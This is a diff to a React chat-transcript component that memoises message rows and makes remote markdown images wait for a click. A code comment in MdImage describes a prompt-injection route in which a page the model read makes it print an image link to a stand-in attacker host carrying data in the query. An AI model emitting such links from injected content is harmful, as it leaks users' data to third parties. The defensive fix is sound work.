@@ -1,4 +1,4 @@
-import { Fragment, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
+import { Fragment, memo, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
 import { api, learnApi, type LearnedItem } from "../lib/api";
 import {
   AlertTriangle,
@@ -70,7 +70,7 @@ function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: s
     window.addEventListener("keydown", onKey);
     return () => window.removeEventListener("keydown", onKey);
   }, [onClose]);
-  const open = () => (isWeb(src) ? window.open(src, "_blank", "noopener") : void api.openImage(src));
+  const open = () => (isWeb(src) ? void api.openUrl(src) : void api.openImage(src));
   return (
     <div className="lightbox" role="dialog" aria-label={alt || "Imagem"} onClick={onClose}>
       <img src={url} alt={alt} onClick={(e) => e.stopPropagation()} />
@@ -91,10 +91,21 @@ function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: s
 /** `![alt](src)`: web and data URLs load directly; a local path is read
  * through the core, which only hands back image files. */
 function MdImage({ src, alt }: { src: string; alt: string }) {
-  const [url, setUrl] = useState<string | null>(isWeb(src) ? src : null);
+  // A page the model read can make it print `![](https://attacker/x?d=...)`:
+  // loading that by itself is a zero-click ping (or a leak in the query). A
+  // remote image therefore waits for the click; local files and data: URLs
+  // load as before.
+  const remote = /^https?:/i.test(src);
+  const [allowed, setAllowed] = useState(!remote);
+  const [url, setUrl] = useState<string | null>(isWeb(src) && !remote ? src : null);
   const [failed, setFailed] = useState<string | null>(null);
   const [zoom, setZoom] = useState(false);
   useEffect(() => {
+    if (remote) {
+      if (!allowed) return;
+      setUrl(src);
+      return;
+    }
     if (isWeb(src)) return;
     let live = true;
     api
@@ -111,6 +122,26 @@ function MdImage({ src, alt }: { src: string; alt: string }) {
         <ImageOff size={14} strokeWidth={2} />
         {alt || src}
       </span>
+    );
+  }
+  if (!allowed) {
+    let host = src;
+    try {
+      host = new URL(src).host;
+    } catch {
+      /* keep the raw text */
+    }
+    return (
+      <button
+        type="button"
+        className="md-img-pending"
+        onClick={() => setAllowed(true)}
+        title={src}
+      >
+        <ImageOff size={14} strokeWidth={2} aria-hidden />
+        <span>Imagem de {host}</span>
+        <span className="md-img-load">Carregar</span>
+      </button>
     );
   }
   if (!url) return <span className="md-img loading" aria-label="Carregando imagem" />;
@@ -310,7 +341,7 @@ function ToolLine({ row }: { row: ToolRow }) {
   );
 }
 
-function AssistantBlock(props: {
+const AssistantBlock = memo(function AssistantBlock(props: {
   block: Block & { kind: "assistant" };
   sessionId?: string | null;
   onBranch?: (id: number) => void;
@@ -381,7 +412,48 @@ function AssistantBlock(props: {
       </div>
     </div>
   );
-}
+});
+
+
+/** One prompt, with its attached images and its "Editar" action. Memoised: it
+ * never changes while the answer below it streams. */
+const UserRow = memo(function UserRow(props: {
+  block: Block & { kind: "user" };
+  onEdit?: (id: number, text: string) => void;
+}) {
+  const b = props.block;
+  const onEdit = props.onEdit;
+  // Attached images arrive as `![nome](<path>)` lines (Composer).
+  const imgs = useMemo(() => [...b.text.matchAll(USER_IMG)], [b.text]);
+  const text = imgs.length ? b.text.replace(USER_IMG, "").trim() : b.text;
+  return (
+    <div className="msg-user-row">
+      <div className="msg-user">
+        {imgs.length ? (
+          <div className="msg-user-imgs">
+            {imgs.map((m, j) => (
+              <MdImage key={j} src={m[2]} alt={m[1]} />
+            ))}
+          </div>
+        ) : null}
+        {text}
+      </div>
+      {onEdit && b.id != null ? (
+        <div className="msg-actions">
+          <button
+            className="copy-btn"
+            onClick={() => onEdit(b.id!, b.text)}
+            aria-label="Editar"
+            title="Editar: nova conversa a partir daqui com esta mensagem no campo"
+          >
+            <Pencil size={14} strokeWidth={2} />
+            <span>Editar</span>
+          </button>
+        </div>
+      ) : null}
+    </div>
+  );
+});
 
 export function Transcript(props: {
   blocks: Block[];
@@ -435,50 +507,27 @@ export function Transcript(props: {
           </div>
         ) : null}
         {props.blocks.map((b, i) => {
+          // A block the event did not touch keeps its reference, so `memo`
+          // skips it: only the answer being written is re-rendered. The key is
+          // the stored row when there is one, so a list that grows at the top
+          // (a compaction note) does not re-key everything.
+          const key =
+            b.kind === "assistant" ? (b.stored ?? `a${i}`) : b.kind === "user" ? (b.id ?? `u${i}`) : `n${i}`;
           if (b.kind === "user") {
-            // Attached images arrive as `![nome](<path>)` lines (Composer).
-            const imgs = [...b.text.matchAll(USER_IMG)];
-            const text = imgs.length ? b.text.replace(USER_IMG, "").trim() : b.text;
-            return (
-              <div key={i} className="msg-user-row">
-                <div className="msg-user">
-                  {imgs.length ? (
-                    <div className="msg-user-imgs">
-                      {imgs.map((m, j) => (
-                        <MdImage key={j} src={m[2]} alt={m[1]} />
-                      ))}
-                    </div>
-                  ) : null}
-                  {text}
-                </div>
-                {onEdit && b.id != null ? (
-                  <div className="msg-actions">
-                    <button
-                      className="copy-btn"
-                      onClick={() => onEdit(b.id!, b.text)}
-                      aria-label="Editar"
-                      title="Editar: nova conversa a partir daqui com esta mensagem no campo"
-                    >
-                      <Pencil size={14} strokeWidth={2} />
-                      <span>Editar</span>
-                    </button>
-                  </div>
-                ) : null}
-              </div>
-            );
+            return <UserRow key={key} block={b} onEdit={onEdit} />;
           }
           if (b.kind === "note" && b.learned?.length) {
-            return <LearnedNote key={i} text={b.text} items={b.learned} />;
+            return <LearnedNote key={key} text={b.text} items={b.learned} />;
           }
           if (b.kind === "note") {
             return (
-              <div key={i} className="msg-note">
+              <div key={key} className="msg-note">
                 <Info size={14} strokeWidth={2} />
                 <span>{b.text}</span>
               </div>
             );
           }
-          return <AssistantBlock key={i} block={b} sessionId={props.sessionId} onBranch={onBranch} />;
+          return <AssistantBlock key={key} block={b} sessionId={props.sessionId} onBranch={onBranch} />;
         })}
         {props.tail}
       </div>
